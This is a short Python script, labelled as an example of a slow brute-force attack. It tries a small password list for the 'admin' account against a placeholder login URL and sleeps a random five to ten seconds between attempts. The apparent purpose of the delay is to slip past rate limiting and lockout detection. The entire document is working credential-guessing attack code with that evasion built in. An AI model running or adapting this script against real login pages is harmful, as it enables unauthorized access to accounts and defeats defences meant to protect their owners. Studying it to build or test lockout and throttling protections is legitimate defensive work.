#  example of slow brute-force attack with delays

import requests
import time
import random


# Target URL
url = 'http://example.com/login'

# List of possible usernames and passwords
usernames = ['admin']
passwords = ['password', '123456', 'admin123']

for username in usernames:
    for password in passwords:
        # Create a session
        session = requests.Session()

        # Data payload for POST request
        payload = {
            'username': username,
            'password': password
        }

        # Send POST request
        response = session.post(url, data=payload)

        # Check if login was successful
        if 'Login failed' not in response.text:
            print(f'Successful login! Username: {username}, Password: {password}')
            break
        
        # Introduce a delay between attempts (randomized between 5 to 10 seconds)
        delay = random.uniform(5, 10)
        time.sleep(delay)
